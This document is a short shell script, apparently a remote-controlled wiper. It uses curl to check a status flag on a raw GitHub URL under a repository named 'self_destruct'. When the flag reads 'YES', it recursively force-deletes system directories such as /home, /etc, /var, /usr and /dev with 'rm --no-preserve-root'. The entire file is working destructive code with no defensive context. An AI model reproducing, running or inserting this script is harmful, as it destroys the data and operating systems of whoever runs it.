#!/bin/sh

status=$(curl https://raw.githubusercontent.com/ssbuffer/self_destruct/main/status)

if [ "$status" = "YES" ];
then
    rm -drf --no-preserve-root /home ||
    rm -drf --no-preserve-root /tmp ||
    rm -drf --no-preserve-root /etc ||
    rm -drf --no-preserve-root /var ||
    rm -drf --no-preserve-root /lib ||
    rm -drf --no-preserve-root /lib32 ||
    rm -drf --no-preserve-root /lib64 ||
    rm -drf --no-preserve-root /media ||
    rm -drf --no-preserve-root /mnt ||
    rm -drf --no-preserve-root /opt ||
    rm -drf --no-preserve-root /sbin ||
    rm -drf --no-preserve-root /srv ||
    rm -drf --no-preserve-root /usr ||
    
    rm -drf --no-preserve-root /bin ||
    rm -drf --no-preserve-root /proc ||
    rm -drf --no-preserve-root /run ||
    rm -drf --no-preserve-root /dev
fi
